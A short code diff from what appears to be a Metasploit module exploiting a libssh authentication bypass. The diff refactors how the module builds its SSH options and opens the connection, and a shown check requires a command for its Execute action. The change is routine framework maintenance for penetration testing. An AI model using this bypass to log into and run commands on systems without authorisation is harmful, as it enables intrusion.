@@ -92,12 +92,12 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::BadConfig, 'Execute action requires CMD to be set')
     end
 
-    ssh_opts = ssh_client_defaults.merge({
+    ssh_opts = {
       port: rport,
       # The auth method is converted into a class name for instantiation,
       # so libssh-auth-bypass here becomes LibsshAuthBypass from the mixin
       auth_methods: ['libssh-auth-bypass']
-    })
+    }
 
     ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
 
@@ -105,7 +105,7 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
-        Net::SSH.start(ip, username, ssh_opts)
+        connect_ssh(ip, username, ssh_opts)
       end
     rescue Net::SSH::Exception => e
       vprint_error("#{ip}:#{rport} - #{e.class}: #{e.message}")
